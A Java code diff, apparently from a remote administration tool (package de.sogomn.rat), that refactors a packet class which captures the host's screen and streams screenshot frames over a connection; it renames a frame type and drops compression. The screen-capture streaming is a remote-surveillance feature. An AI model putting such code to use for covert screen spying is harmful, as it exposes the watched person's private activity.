@@ -9,12 +9,11 @@ import java.util.stream.Stream;
 import de.sogomn.engine.util.ImageUtils;
 import de.sogomn.rat.ActiveConnection;
 import de.sogomn.rat.util.FrameEncoder;
-import de.sogomn.rat.util.FrameEncoder.IFrame;
-import de.sogomn.rat.util.QuickLZ;
+import de.sogomn.rat.util.FrameEncoder.Frame;
 
 public final class DesktopPacket extends AbstractPingPongPacket {
 	
-	private IFrame[] frames;
+	private Frame[] frames;
 	private int screenWidth, screenHeight;
 	
 	private byte deleteLastScreenshot;
@@ -44,8 +43,7 @@ public final class DesktopPacket extends AbstractPingPongPacket {
 	@Override
 	protected void sendData(final ActiveConnection connection) {
 		Stream.of(frames).forEach(frame -> {
-			byte[] data = ImageUtils.toByteArray(frame.image, 0);
-			data = QuickLZ.compress(data);
+			final byte[] data = ImageUtils.toByteArray(frame.image, 0);
 			
 			connection.writeByte(INCOMING);
 			connection.writeShort((short)frame.x);
@@ -66,24 +64,23 @@ public final class DesktopPacket extends AbstractPingPongPacket {
 	
 	@Override
 	protected void receiveData(final ActiveConnection connection) {
-		final ArrayList<IFrame> framesList = new ArrayList<IFrame>();
+		final ArrayList<Frame> framesList = new ArrayList<Frame>();
 		
 		while (connection.readByte() == INCOMING) {
 			final int x = connection.readShort();
 			final int y = connection.readShort();
 			final int length = connection.readInt();
+			final byte[] data = new byte[length];
 			
-			byte[] data = new byte[length];
 			connection.read(data);
-			data = QuickLZ.decompress(data);
 			
 			final BufferedImage image = ImageUtils.toImage(data);
-			final IFrame frame = new IFrame(x, y, image);
+			final Frame frame = new Frame(x, y, image);
 			
 			framesList.add(frame);
 		}
 		
-		frames = framesList.stream().toArray(IFrame[]::new);
+		frames = framesList.stream().toArray(Frame[]::new);
 		screenWidth = connection.readInt();
 		screenHeight = connection.readInt();
 	}
@@ -94,14 +91,14 @@ public final class DesktopPacket extends AbstractPingPongPacket {
 		final Dimension screenSize = Toolkit.getDefaultToolkit().getScreenSize();
 		
 		if (deleteLastScreenshot == DELETE || lastScreenshot == null) {
-			final IFrame frame = new IFrame(0, 0, screenshot);
+			final Frame frame = new Frame(0, 0, screenshot);
 			
-			frames = new IFrame[1];
+			frames = new Frame[1];
 			frames[0] = frame;
 		} else if (deleteLastScreenshot == KEEP) {
 			frames = FrameEncoder.getIFrames(lastScreenshot, screenshot);
 		} else {
-			frames = new IFrame[0];
+			frames = new Frame[0];
 		}
 		
 		type = DATA;
@@ -117,7 +114,7 @@ public final class DesktopPacket extends AbstractPingPongPacket {
 		//...
 	}
 	
-	public IFrame[] getFrames() {
+	public Frame[] getFrames() {
 		return frames;
 	}
 	
